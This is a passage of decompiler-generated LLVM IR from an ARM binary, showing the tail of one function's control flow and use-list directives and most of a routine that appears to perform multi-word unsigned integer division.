dec_label_pc_17c7c:                               ; preds = %dec_label_pc_1779c
  %v3_17c80 = icmp ugt i32 %v0_178d4, 16777214
  %v9_17c80 = icmp eq i32 %v0_178d4, 16777215
  %v2_17c84 = xor i1 %v9_17c80, true
  %v3_17c84 = and i1 %v3_17c80, %v2_17c84
  br i1 %v3_17c84, label %bb180, label %bb181

bb180:                                            ; preds = %dec_label_pc_17c7c
  br label %bb181

bb181:                                            ; preds = %dec_label_pc_17c7c, %bb180
  %v1_177b855 = phi i32 [ 16777215, %dec_label_pc_17c7c ], [ 24, %bb180 ]
  %v2_17c88 = xor i1 %v3_17c80, true
  %v3_17c88 = or i1 %v9_17c80, %v2_17c88
  br i1 %v3_17c88, label %bb182, label %bb183

bb182:                                            ; preds = %bb181
  br label %bb183

bb183:                                            ; preds = %bb181, %bb182
  %v1_177b854 = phi i32 [ %v1_177b855, %bb181 ], [ 16, %bb182 ]
  br i1 %v3_17c84, label %bb184, label %bb185

bb184:                                            ; preds = %bb183
  br label %bb185

bb185:                                            ; preds = %bb183, %bb184
  %v0_177c859 = phi i32 [ %v0_177c860, %bb183 ], [ 8, %bb184 ]
  br i1 %v3_17c88, label %bb186, label %bb126

bb186:                                            ; preds = %bb185
  br label %bb126

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c00
  %tmp205 = icmp ugt i32 %v2_17be4, %v2_17c00
  br i1 %tmp205, label %bb187, label %dec_label_pc_17c0c

bb187:                                            ; preds = %dec_label_pc_17c98
  %v6_17c9c = add i32 %v2_17c00, %v1_17c00
  %v5_17ca0 = add i32 %v0_17bd0, -2
  store i32 %v5_17ca0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17c0c

dec_label_pc_17ca8:                               ; preds = %dec_label_pc_17bb0
  %tmp206 = icmp ugt i32 %v2_17b94, %v2_17bb4
  br i1 %tmp206, label %bb188, label %.thread104

bb188:                                            ; preds = %dec_label_pc_17ca8
  %v5_17cac = add i32 %v0_17b74, -2
  %v6_17cb0 = add i32 %v2_17bb4, %v0_17b88
  br label %.thread104

.thread104:                                       ; preds = %dec_label_pc_17ca8, %bb188
  %v4_17cb4102 = phi i32 [ %v5_17cac, %bb188 ], [ %v1_17bb8, %dec_label_pc_17ca8 ]
  %v1_17bc441 = phi i32 [ %v6_17cb0, %bb188 ], [ %v2_17bb4, %dec_label_pc_17ca8 ]
  %v4_17cb4.v1_17bb8 = select i1 %tmp206, i32 %v4_17cb4102, i32 %v1_17bb8
  br label %dec_label_pc_17bc4

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_179d0
  %tmp207 = icmp ugt i32 %v2_179b4, %v2_179d0
  br i1 %tmp207, label %bb189, label %dec_label_pc_179dc

bb189:                                            ; preds = %dec_label_pc_17cbc
  %v5_17cc0 = add i32 %v1_179b4, -2
  %v6_17cc4 = add i32 %v2_179d0, %v1_179d0
  br label %dec_label_pc_179dc

dec_label_pc_17ccc:                               ; preds = %dec_label_pc_17988
  %tmp208 = icmp ugt i32 %v2_17970, %v2_17988
  br i1 %tmp208, label %bb190, label %dec_label_pc_17994

bb190:                                            ; preds = %dec_label_pc_17ccc
  %v5_17cd0 = add i32 %v0_17954, -2
  store i32 %v5_17cd0, i32* %fp.global-to-local, align 4
  %v6_17cd4 = add i32 %v2_17988, %v0_17968
  br label %dec_label_pc_17994

; uselistorder directives
  uselistorder i1 %tmp206, { 1, 0 }
  uselistorder i32 %v5_17ca0, { 1, 0 }
  uselistorder i32 %v1_177b854, { 1, 0 }
  uselistorder i1 %v9_17c80, { 1, 0 }
  uselistorder i1 %v9_17c58, { 1, 0 }
  uselistorder i32 %v7_17c58, { 1, 0 }
  uselistorder i32 %v2_17c38, { 1, 2, 0, 3 }
  uselistorder i32 %v2_17c2c, { 1, 0 }
  uselistorder i32 %v3_17c1c, { 2, 1, 0 }
  uselistorder i32 %v0_17c1c, { 1, 0 }
  uselistorder i32 %v3_17c18, { 2, 1, 0 }
  uselistorder i32 %v5_17c14, { 3, 1, 0, 2 }
  uselistorder i32 %v2_17c00, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_17bf4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17be4, { 0, 2, 1 }
  uselistorder i32 %v0_17bd0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_17bc8, { 1, 0, 2 }
  uselistorder i32 %v1_17bb8, { 1, 0, 2 }
  uselistorder i32 %v2_17bb4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v1_17ba8, { 1, 0 }
  uselistorder i32 %v0_17ba8, { 1, 0 }
  uselistorder i32 %v5_17ba0, { 1, 2, 0, 3 }
  uselistorder i32 %v3_17b90, { 1, 0 }
  uselistorder i32 %v0_17b88, { 1, 2, 0 }
  uselistorder i32 %v0_17b74, { 1, 3, 2, 0 }
  uselistorder i32 %v3_17b64, { 1, 0, 3, 2 }
  uselistorder i32 %v0_17b44, { 1, 0 }
  uselistorder i32 %v6_17b38, { 1, 0 }
  uselistorder i1 %v2_17b24, { 1, 0 }
  uselistorder i1 %v7_17b20, { 1, 2, 0 }
  uselistorder i1 %v7_17b08, { 1, 0 }
  uselistorder i32 %v1_17af0, { 1, 0 }
  uselistorder i32 %v0_1776886, { 1, 0 }
  uselistorder i32 %v0_1776c89, { 1, 0 }
  uselistorder i32 %v6_17adc, { 1, 0 }
  uselistorder i32 %v0_1776c85, { 1, 0, 3, 2 }
  uselistorder i32 %v0_1776884, { 0, 2, 1 }
  uselistorder i1 %v3_17ac0, { 1, 0 }
  uselistorder i32 %v0_17ab8, { 1, 0 }
  uselistorder i32 %v6_17aac, { 1, 0 }
  uselistorder i1 %v2_17a98, { 1, 0 }
  uselistorder i1 %v9_17a94, { 1, 2, 0 }
  uselistorder i32 %v5_17a5c, { 2, 1, 0 }
  uselistorder i32 %v1_17a50, { 2, 1, 3, 0 }
  uselistorder i32 %v2_17a18, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_17a0c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17a04, { 2, 0, 1 }
  uselistorder i32 %v0_179f0, { 1, 0, 2, 3 }
  uselistorder i32 %v2_179d0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_179c4, { 2, 3, 1, 0 }
  uselistorder i32 %v2_179b4, { 0, 2, 1 }
  uselistorder i32 %v1_179b4, { 2, 1, 3, 0 }
  uselistorder i32 %v2_17988, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v5_1797c, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17970, { 0, 2, 1 }
  uselistorder i32 %v3_1796c, { 1, 0 }
  uselistorder i32 %v0_17968, { 1, 2, 0 }
  uselistorder i32 %v0_17954, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17944, { 1, 0 }
  uselistorder i32 %v4_17924, { 1, 0 }
  uselistorder i32 %v2_1791c, { 1, 0, 2 }
  uselistorder i32 %v6_17910, { 1, 0 }
  uselistorder i1 %v9_178f0, { 1, 0 }
  uselistorder i32 %v0_17934, { 9, 8, 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v5_17860, { 2, 1, 0 }
  uselistorder i32 %v1_17854, { 2, 1, 3, 0 }
  uselistorder i32 %v0_17838, { 1, 0, 2 }
  uselistorder i32 %v2_1781c, { 2, 3, 1, 0, 4 }
  uselistorder i32 %v5_17810, { 2, 3, 1, 0 }
  uselistorder i32 %v2_17808, { 2, 0, 1 }
  uselistorder i32 %v3_17804, { 1, 0 }
  uselistorder i32 %v0_17800, { 1, 2, 0 }
  uselistorder i32 %v0_177ec, { 1, 0, 2, 3 }
  uselistorder i32 %v3_177dc, { 1, 0 }
  uselistorder i32 %v3_177dc24, { 1, 0 }
  uselistorder i32 %v6_177c4, { 1, 0 }
  uselistorder i32 %v0_177c8, { 1, 0 }
  uselistorder i1 %v7_177a4, { 1, 0 }
  uselistorder i32 %v0_1778c, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_177cc, { 6, 7, 5, 1, 2, 3, 4, 0, 8 }
  uselistorder i32 %v0_178d4, { 5, 6, 12, 11, 2, 9, 3, 1, 4, 7, 8, 10, 0, 13 }
  uselistorder i32 %v0_177c860, { 1, 0 }
  uselistorder i32 %v1_17ac0, { 5, 6, 2, 12, 11, 4, 7, 3, 8, 9, 10, 0, 1, 13 }
  uselistorder i32 %v0_1776c90, { 1, 0 }
  uselistorder i32 %v0_1776c, { 2, 1, 0, 3 }
  uselistorder i32 %v0_17768, { 1, 0, 2 }
  uselistorder i32 %v0_17750, { 1, 2, 0, 3 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 2, 3, 5, 6, 7, 10, 8, 9, 11 }
  uselistorder i32* %sb.global-to-local, { 2, 3, 4, 0, 5, 6, 7, 8, 1, 9 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 2, 15, 5, 6, 3, 4, 7, 14, 11, 12, 8, 13, 9, 10 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 8, 9, 10, 3, 4, 5, 6, 11, 12, 7, 13 }
  uselistorder i32* %fp.global-to-local, { 0, 2, 3, 1, 4, 5, 7, 6, 8, 9 }
  uselistorder i32 65535, { 96, 97, 98, 99, 0, 1, 13, 12, 14, 4, 5, 24, 47, 25, 48, 26, 49, 15, 16, 6, 27, 50, 28, 51, 52, 17, 53, 7, 29, 54, 30, 55, 31, 56, 57, 58, 32, 59, 60, 61, 18, 62, 8, 63, 64, 65, 66, 33, 67, 34, 68, 69, 19, 70, 9, 71, 72, 35, 73, 36, 74, 37, 75, 38, 76, 20, 10, 77, 78, 11, 39, 79, 40, 80, 81, 82, 21, 83, 84, 2, 41, 85, 42, 86, 43, 87, 88, 89, 22, 90, 91, 3, 44, 92, 45, 93, 46, 94, 23, 95 }
  uselistorder label %.thread104, { 1, 0 }
  uselistorder label %bb185, { 1, 0 }
  uselistorder label %bb183, { 1, 0 }
  uselistorder label %bb181, { 1, 0 }
  uselistorder label %dec_label_pc_17c70, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb176, { 1, 0 }
  uselistorder label %bb172, { 1, 0 }
  uselistorder label %dec_label_pc_17c0c, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17b4c, { 1, 0 }
  uselistorder label %bb169, { 1, 0 }
  uselistorder label %bb167, { 1, 0 }
  uselistorder label %bb165, { 1, 0 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %.thread98, { 1, 0 }
  uselistorder label %bb159, { 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %dec_label_pc_17ac0, { 1, 0 }
  uselistorder label %bb154, { 1, 0 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
  uselistorder label %bb145, { 3, 2, 1, 0 }
  uselistorder label %.thread96, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_179e8, { 1, 0 }
  uselistorder label %dec_label_pc_179dc, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_17994, { 2, 1, 3, 0 }
  uselistorder label %bb141, { 1, 0, 3, 2 }
  uselistorder label %bb139, { 1, 0 }
  uselistorder label %bb137, { 1, 0 }
  uselistorder label %bb135, { 1, 0 }
  uselistorder label %dec_label_pc_178e4, { 1, 0 }
  uselistorder label %dec_label_pc_178c0, { 1, 0 }
  uselistorder label %dec_label_pc_178a0, { 2, 1, 0, 3, 5, 4 }
  uselistorder label %dec_label_pc_17898, { 2, 0, 1 }
  uselistorder label %bb132, { 3, 2, 1, 0 }
  uselistorder label %.thread95, { 3, 1, 2, 0 }
  uselistorder label %bb129, { 1, 0 }
  uselistorder label %bb126, { 0, 1, 3, 2 }
  uselistorder label %.thread94, { 1, 0 }
  uselistorder label %bb123, { 1, 0 }
  uselistorder label %dec_label_pc_17780, { 2, 0, 1 }
}

define i32 @function_17ce4() local_unnamed_addr {
dec_label_pc_17ce4:
  %fp.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v12_17ce4 = load i32, i32* @r7, align 4
  %v27_17ce4 = load i32, i32* @lr, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_17cf8 = load i32, i32* @r3, align 4
  %v2_17cf8 = icmp eq i32 %v0_17cf8, 0
  store i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32* @r4, align 4
  %v0_17d00 = load i32, i32* @r1, align 4
  store i32 %v0_17d00, i32* %r6.global-to-local, align 4
  %v0_17d08 = load i32, i32* @r2, align 4
  store i32 %v0_17d08, i32* @r5, align 4
  %v0_17d0c = load i32, i32* @r0, align 4
  store i32 %v0_17d0c, i32* %sb.global-to-local, align 4
  br i1 %v2_17cf8, label %dec_label_pc_17d14, label %dec_label_pc_17e10

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17ce4
  %tmp = icmp ugt i32 %v0_17d08, %v0_17d00
  br i1 %tmp, label %dec_label_pc_17d1c, label %dec_label_pc_17e84

dec_label_pc_17d1c:                               ; preds = %dec_label_pc_17d14
  %v3_17d20 = icmp ult i32 %v0_17d08, 65534
  br i1 %v3_17d20, label %dec_label_pc_181b4, label %dec_label_pc_17d24

dec_label_pc_17d24:                               ; preds = %dec_label_pc_17d1c
  %v3_17d28 = icmp ugt i32 %v0_17d08, 16777214
  %v9_17d28 = icmp eq i32 %v0_17d08, 16777215
  %v2_17d2c = xor i1 %v9_17d28, true
  %v3_17d2c = and i1 %v3_17d28, %v2_17d2c
  br i1 %v3_17d2c, label %bb, label %bb86

bb:                                               ; preds = %dec_label_pc_17d24
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_17d24, %bb
  %v1_17d3c35 = phi i32 [ 16777215, %dec_label_pc_17d24 ], [ 24, %bb ]
  %v2_17d30 = xor i1 %v3_17d28, true
  %v3_17d30 = or i1 %v9_17d28, %v2_17d30
  br i1 %v3_17d30, label %bb87, label %bb88

bb87:                                             ; preds = %bb86
  br label %bb88

bb88:                                             ; preds = %bb86, %bb87
  %v1_17d3c34 = phi i32 [ %v1_17d3c35, %bb86 ], [ 16, %bb87 ]
  br i1 %v3_17d2c, label %bb89, label %bb90

bb89:                                             ; preds = %bb88
  store i32 8, i32* @ip, align 4
  br label %bb90

bb90:                                             ; preds = %bb88, %bb89
  br i1 %v3_17d30, label %bb91, label %bb92

bb91:                                             ; preds = %bb90
  store i32 16, i32* @ip, align 4
  br label %bb92

bb92:                                             ; preds = %bb147, %.thread62, %bb90, %bb91
  %v1_17d3c = phi i32 [ 8, %bb147 ], [ 0, %.thread62 ], [ %v1_17d3c34, %bb90 ], [ %v1_17d3c34, %bb91 ]
  %v6_17d3c = lshr i32 %v0_17d08, %v1_17d3c
  %v4_17d44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), align 4
  %v2_17d48 = add i32 %v4_17d44, %v6_17d3c
  %v3_17d48 = inttoptr i32 %v2_17d48 to i8*
  %v4_17d48 = load i8, i8* %v3_17d48, align 1
  %v6_17d48 = zext i8 %v4_17d48 to i32
  %v0_17d4c = load i32, i32* @ip, align 4
  %v2_17d4c = sub i32 %v0_17d4c, %v6_17d48
  %v9_17d4c = icmp eq i32 %v0_17d4c, %v6_17d48
  br i1 %v9_17d4c, label %.critedge, label %.thread2

.thread2:                                         ; preds = %bb92
  %v7_17d50 = shl i32 %v0_17d00, %v2_17d4c
  %v2_17d54 = sub i32 32, %v2_17d4c
  %v7_17d58 = shl i32 %v0_17d08, %v2_17d4c
  store i32 %v7_17d58, i32* @r5, align 4
  %v8_17d5c = lshr i32 %v0_17d0c, %v2_17d54
  %v9_17d5c = or i32 %v8_17d5c, %v7_17d50
  store i32 %v9_17d5c, i32* %r6.global-to-local, align 4
  %v3_17d60 = udiv i32 %v7_17d58, 65536
  store i32 %v3_17d60, i32* %r8.global-to-local, align 4
  store i32 %v3_17d60, i32* @r1, align 4
  store i32 %v9_17d5c, i32* @r0, align 4
  %v7_17d6c = shl i32 %v0_17d0c, %v2_17d4c
  store i32 %v7_17d6c, i32* %sb.global-to-local, align 4
  br label %bb94

.critedge:                                        ; preds = %bb92
  %v3_17d60.c = udiv i32 %v0_17d08, 65536
  store i32 %v3_17d60.c, i32* %r8.global-to-local, align 4
  store i32 %v3_17d60.c, i32* @r1, align 4
  store i32 %v0_17d00, i32* @r0, align 4
  br label %bb94

bb94:                                             ; preds = %.critedge, %.thread2
  %v0_17d70 = call i32 @function_1296c()
  %v0_17d74 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17d70, i32* %sl.global-to-local, align 4
  %v0_17d7c = load i32, i32* %r6.global-to-local, align 4
  %v2_17d80 = call i32 @function_12a68(i32 %v0_17d7c, i32 %v0_17d74)
  %v0_17d84 = load i32, i32* @r5, align 4
  %v3_17d88 = urem i32 %v0_17d84, 65536
  store i32 %v3_17d88, i32* @r7, align 4
  %v2_17d8c = mul i32 %v0_17d70, %v3_17d88
  %v0_17d90 = load i32, i32* %sb.global-to-local, align 4
  %v3_17d90 = udiv i32 %v0_17d90, 65536
  %v4_17d94 = mul i32 %v0_17d74, 65536
  %v5_17d94 = or i32 %v3_17d90, %v4_17d94
  %tmp152 = icmp ugt i32 %v2_17d8c, %v5_17d94
  br i1 %tmp152, label %dec_label_pc_17da0, label %.thread57

dec_label_pc_17da0:                               ; preds = %bb94
  %v2_17da0 = add i32 %v5_17d94, %v0_17d84
  %v3_17da0 = icmp ult i32 %v2_17da0, %v5_17d94
  %v1_17da4 = add i32 %v0_17d70, -1
  store i32 %v1_17da4, i32* %sl.global-to-local, align 4
  br i1 %v3_17da0, label %.thread57, label %dec_label_pc_17dac

dec_label_pc_17dac:                               ; preds = %dec_label_pc_17da0
  %tmp153 = icmp ugt i32 %v2_17d8c, %v2_17da0
  br i1 %tmp153, label %bb95, label %.thread57

bb95:                                             ; preds = %dec_label_pc_17dac
  %v5_17db0 = add i32 %v0_17d70, -2
  store i32 %v5_17db0, i32* %sl.global-to-local, align 4
  %v6_17db4 = add i32 %v2_17da0, %v0_17d84
  br label %.thread57

.thread57:                                        ; preds = %bb94, %dec_label_pc_17dac, %dec_label_pc_17da0, %bb95
  %v1_17db8 = phi i32 [ %v2_17da0, %dec_label_pc_17da0 ], [ %v5_17d94, %bb94 ], [ %v6_17db4, %bb95 ], [ %v2_17da0, %dec_label_pc_17dac ]
  %v2_17db8 = sub i32 %v1_17db8, %v2_17d8c
  store i32 %v2_17db8, i32* @r4, align 4
  %v0_17dbc = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_17dbc, i32* @r1, align 4
  store i32 %v2_17db8, i32* @r0, align 4
  %v0_17dc4 = call i32 @function_1296c()
  store i32 %v0_17dc4, i32* %r6.global-to-local, align 4
  %v0_17dd0 = load i32, i32* @r4, align 4
  %v2_17dd4 = call i32 @function_12a68(i32 %v0_17dd0, i32 %v0_17dbc)
  %v0_17dd8 = load i32, i32* @r7, align 4
  %v2_17dd8 = mul i32 %v0_17dc4, %v0_17dd8
  %v0_17ddc = load i32, i32* %sb.global-to-local, align 4
  %v3_17de0 = urem i32 %v0_17ddc, 65536
  %v4_17de4 = mul i32 %v0_17dbc, 65536
  %v5_17de4 = or i32 %v3_17de0, %v4_17de4
  %tmp154 = icmp ugt i32 %v2_17dd8, %v5_17de4
  br i1 %tmp154, label %dec_label_pc_17df0, label %bb97

dec_label_pc_17df0:                               ; preds = %.thread57
  %v1_17df0 = load i32, i32* @r5, align 4
  %v2_17df0 = add i32 %v1_17df0, %v5_17de4
  %v3_17df0 = icmp ult i32 %v2_17df0, %v5_17de4
  %v1_17df4 = add i32 %v0_17dc4, -1
  store i32 %v1_17df4, i32* %r6.global-to-local, align 4
  br i1 %v3_17df0, label %bb97, label %dec_label_pc_17dfc

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17df0
  %tmp155 = icmp ugt i32 %v2_17dd8, %v2_17df0
  br i1 %tmp155, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_17dfc
  %v5_17e00 = add i32 %v0_17dc4, -2
  store i32 %v5_17e00, i32* %r6.global-to-local, align 4
  br label %bb97

bb97:                                             ; preds = %.thread57, %dec_label_pc_17df0, %dec_label_pc_17dfc, %bb96
  %v0_17e04 = phi i32 [ %v1_17df4, %dec_label_pc_17df0 ], [ %v0_17dc4, %.thread57 ], [ %v1_17df4, %dec_label_pc_17dfc ], [ %v5_17e00, %bb96 ]
  %v1_17e04 = load i32, i32* %sl.global-to-local, align 4
  %v4_17e04 = mul i32 %v1_17e04, 65536
  %v5_17e04 = or i32 %v4_17e04, %v0_17e04
  br label %dec_label_pc_17e70

dec_label_pc_17e10:                               ; preds = %dec_label_pc_17ce4
  %v3_17e10 = icmp uge i32 %v0_17cf8, %v0_17d00
  %v9_17e10 = icmp eq i32 %v0_17d00, %v0_17cf8
  %v2_17e18 = xor i1 %v9_17e10, true
  %v3_17e18 = and i1 %v3_17e10, %v2_17e18
  br i1 %v3_17e18, label %dec_label_pc_17e68, label %dec_label_pc_17e1c

dec_label_pc_17e1c:                               ; preds = %dec_label_pc_17e10
  %v3_17e20 = icmp ult i32 %v0_17cf8, 65534
  br i1 %v3_17e20, label %dec_label_pc_18040, label %dec_label_pc_17e24

dec_label_pc_17e24:                               ; preds = %dec_label_pc_17e1c
  %v3_17e28 = icmp ugt i32 %v0_17cf8, 16777214
  %v9_17e28 = icmp eq i32 %v0_17cf8, 16777215
  %v2_17e2c = xor i1 %v9_17e28, true
  %v3_17e2c = and i1 %v3_17e28, %v2_17e2c
  br i1 %v3_17e2c, label %bb99, label %bb100

bb99:                                             ; preds = %dec_label_pc_17e24
  br label %bb100

bb100:                                            ; preds = %dec_label_pc_17e24, %bb99
  %v1_17e3412 = phi i32 [ 16777215, %dec_label_pc_17e24 ], [ 24, %bb99 ]
  %v2_17e30 = xor i1 %v3_17e28, true
  %v3_17e30 = or i1 %v9_17e28, %v2_17e30
  br i1 %v3_17e30, label %bb101, label %bb102

bb101:                                            ; preds = %bb100
  br label %bb102

bb102:                                            ; preds = %bb100, %bb101
  %v1_17e34 = phi i32 [ %v1_17e3412, %bb100 ], [ 16, %bb101 ]
  %v2_17e34 = add nsw i32 %v1_17e34, -1
  %v3_17e34 = shl i32 1, %v2_17e34
  %v4_17e34 = and i32 %v3_17e34, %v0_17cf8
  %v5_17e34 = icmp ne i32 %v4_17e34, 0
  %v6_17e34 = lshr i32 %v0_17cf8, %v1_17e34
  %v4_17e3c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2230c.695 to i32), i32 36) to i32*), align 4
  %v2_17e40 = add i32 %v4_17e3c, %v6_17e34
  %v3_17e40 = inttoptr i32 %v2_17e40 to i8*
  %v4_17e40 = load i8, i8* %v3_17e40, align 1
  %v6_17e40 = zext i8 %v4_17e40 to i32
  %v3_17e44 = and i1 %v5_17e34, %v2_17e2c
  br i1 %v3_17e44, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  store i32 8, i32* @lr, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v0_17e4c14 = phi i32 [ %v27_17ce4, %bb102 ], [ 8, %bb103 ]
  %v2_17e48 = xor i1 %v5_17e34, true
  %v3_17e48 = or i1 %v9_17e28, %v2_17e48
  br i1 %v3_17e48, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  store i32 16, i32* @lr, align 4
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v0_17e4c = phi i32 [ %v0_17e4c14, %bb104 ], [ 16, %bb105 ]
  %v2_17e4c = sub i32 %v0_17e4c, %v6_17e40
  store i32 %v2_17e4c, i32* %fp.global-to-local, align 4
  %v9_17e4c = icmp eq i32 %v0_17e4c, %v6_17e40
  br i1 %v9_17e4c, label %dec_label_pc_17e54, label %dec_label_pc_1806c

dec_label_pc_17e54:                               ; preds = %bb106, %bb130
  %v1_17e5c = phi i32 [ %v2_17e4c, %bb106 ], [ %v2_18064, %bb130 ]
  %v3_17e54 = icmp uge i32 %v0_17d00, %v0_17cf8
  %v2_17e58 = xor i1 %v3_17e54, true
  %v3_17e58 = or i1 %v9_17e10, %v2_17e58
  br i1 %v3_17e58, label %bb108, label %bb109

bb108:                                            ; preds = %dec_label_pc_17e54
  %v7_17e58 = icmp ult i32 %v0_17d0c, %v0_17d08
  br i1 %v7_17e58, label %dec_label_pc_17e68, label %.thread3

bb109:                                            ; preds = %dec_label_pc_17e54
  br i1 %v3_17e54, label %.thread3, label %dec_label_pc_17e68

.thread3:                                         ; preds = %bb108, %bb109
  br label %dec_label_pc_17e70

dec_label_pc_17e68:                               ; preds = %bb108, %bb109, %dec_label_pc_17e10
  br label %dec_label_pc_17e70

dec_label_pc_17e70:                               ; preds = %.thread3, %bb139, %dec_label_pc_18190, %bb122, %bb97, %dec_label_pc_17e68
  %v5_17e70 = phi i32 [ 0, %bb139 ], [ %v1_17e5c, %.thread3 ], [ 0, %dec_label_pc_18190 ], [ %v0_18038, %bb122 ], [ 0, %bb97 ], [ 0, %dec_label_pc_17e68 ]
  %v2_17e70 = phi i32 [ %v5_18134, %bb139 ], [ 1, %.thread3 ], [ %v1_18190, %dec_label_pc_18190 ], [ %v5_18034, %bb122 ], [ %v5_17e04, %bb97 ], [ 0, %dec_label_pc_17e68 ]
  store i32 %v5_17e70, i32* @r1, align 4
  store i32 %v12_17ce4, i32* @r7, align 4
  ret i32 %v2_17e70

dec_label_pc_17e84:                               ; preds = %dec_label_pc_17d14
  %v2_17e84 = icmp eq i32 %v0_17d08, 0
  br i1 %v2_17e84, label %dec_label_pc_17e8c, label %dec_label_pc_17e9c

dec_label_pc_17e8c:                               ; preds = %dec_label_pc_17e84
  store i32 0, i32* @r1, align 4
  store i32 1, i32* @r0, align 4
  %v0_17e94 = call i32 @function_1296c()
  store i32 %v0_17e94, i32* @r5, align 4
  br label %dec_label_pc_17e9c

dec_label_pc_17e9c:                               ; preds = %dec_label_pc_17e84, %dec_label_pc_17e8c
  %v0_17eec = phi i32 [ %v0_17d08, %dec_label_pc_17e84 ], [ %v0_17e94, %dec_label_pc_17e8c ]
  %v3_17ea0 = icmp ult i32 %v0_17eec, 65534
  br i1 %v3_17ea0, label %dec_label_pc_1819c, label %dec_label_pc_17ea4

dec_label_pc_17ea4:                               ; preds = %dec_label_pc_17e9c
  %v3_17ea8 = icmp ugt i32 %v0_17eec, 16777214
  %v9_17ea8 = icmp eq i32 %v0_17eec, 16777215
  %v2_17eac = xor i1 %v9_17ea8, true
  %v3_17eac = and i1 %v3_17ea8, %v2_17eac
  br i1 %v3_17eac, label %bb111, label %bb112

bb111:                                            ; preds = %dec_label_pc_17ea4
  br label %bb112

bb112:                                            ; preds = %dec_label_pc_17ea4, %bb111
  %v1_17ebc44 = phi i32 [ 16777215, %dec_label_pc_17ea4 ], [ 24, %bb111 ]
  %v2_17eb0 = xor i1 %v3_17ea8, true
  %v3_17eb0 = or i1 %v9_17ea8, %v2_17eb0
  br i1 %v3_17eb0, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_17ebc43 = phi i32 [ %v1_17ebc44, %bb112 ], [ 16, %bb113 ]
  br i1 %v3_17eac, label %bb115, label %bb116

bb115:                                            ; preds = %bb114
  store i32 8, i32* @ip, align 4
  br label %bb116

bb116:                                            ; preds = %bb114, %bb115
  br i1 %v3_17eb0, label %bb117, label %bb118

bb117:                                            ; preds = %bb116
  store i32 16, i32* @ip, align 4
  br label %bb118

bb118:                                            ; preds = %._crit_edge, %bb143, %bb116, %bb117
  %v1_17ebc = phi i32 [ %v1_17ebc.pre, %._crit_edge ], [ 8, %bb143 ], [ %v1_17ebc43, %bb116 ], [ %v1_17ebc43, %bb117 ]
  %v6_17ebc = lshr i32 %v0_17eec, %v1_17ebc
  %v0_17ec4 = load i32, i32* @r4, align 4
  %v2_17ec4 = add i32 %v0_17ec4, 36
  %v3_17ec4 = inttoptr i32 %v2_17ec4 to i32*
  %v4_17ec4 = load i32, i32* %v3_17ec4, align 4
  %v2_17ec8 = add i32 %v4_17ec4, %v6_17ebc
  %v3_17ec8 = inttoptr i32 %v2_17ec8 to i8*
  %v4_17ec8 = load i8, i8* %v3_17ec8, align 1
  %v6_17ec8 = zext i8 %v4_17ec8 to i32
  %v0_17ecc = load i32, i32* @ip, align 4
  %v2_17ecc = sub i32 %v0_17ecc, %v6_17ec8
  store i32 %v2_17ecc, i32* %sl.global-to-local, align 4
  %v9_17ecc = icmp eq i32 %v0_17ecc, %v6_17ec8
  %v2_17ed4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v9_17ecc, label %.thread8, label %dec_label_pc_17ee8

.thread8:                                         ; preds = %bb118
  %v3_17ed4 = sub i32 %v2_17ed4, %v0_17eec
  store i32 %v3_17ed4, i32* @r4, align 4
  %v4_17ed8 = urem i32 %v0_17eec, 65536
  store i32 %v4_17ed8, i32* %r8.global-to-local, align 4
  %v4_17edc = udiv i32 %v0_17eec, 65536
  store i32 %v4_17edc, i32* @r7, align 4
  store i32 1, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_17fa0

dec_label_pc_17ee8:                               ; preds = %bb118
  %v6_17ee8 = shl i32 %v2_17ed4, %v2_17ecc
  %v6_17eec = shl i32 %v0_17eec, %v2_17ecc
  store i32 %v6_17eec, i32* @r5, align 4
  %v1_17ef0 = sub i32 32, %v2_17ecc
  %v6_17ef4 = lshr i32 %v2_17ed4, %v1_17ef0
  store i32 %v6_17ef4, i32* @r4, align 4
